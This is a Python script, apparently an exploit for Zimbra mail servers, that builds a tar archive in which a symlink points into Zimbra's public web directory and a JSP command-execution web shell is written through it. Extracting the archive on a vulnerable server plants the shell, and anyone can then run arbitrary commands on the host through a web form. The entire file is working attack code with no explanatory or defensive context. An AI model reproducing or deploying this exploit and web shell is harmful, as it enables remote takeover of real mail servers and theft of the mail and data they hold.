import os
import os.path
import tarfile

def make_tarfile(output_filename, source_dir):
    with tarfile.open(output_filename, "w",format=tarfile.GNU_FORMAT) as tar:
        tar.add(source_dir,arcname=source_dir)
        tar.add(source_dir+"/shell.jsp",arcname=source_dir+"/shell.jsp")

# create dir

dir2="/opt/zimbra/jetty_base/webapps/zimbra/public"

if not os.path.isdir(dir2):
        os.mkdir(dir2)

# symlink

os.symlink(dir2,"demo")

# make shell

f = open("demo/shell.jsp", "w")
f.write("""<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream di = new DataInputStream(in);
        String disr = di.readLine();
        while ( disr != null ) {
                out.println(disr);
                disr = di.readLine();
                }
        }
%>
</pre>
</BODY></HTML>
""")
f.close()

# create tar file

make_tarfile("demo.tar","demo")
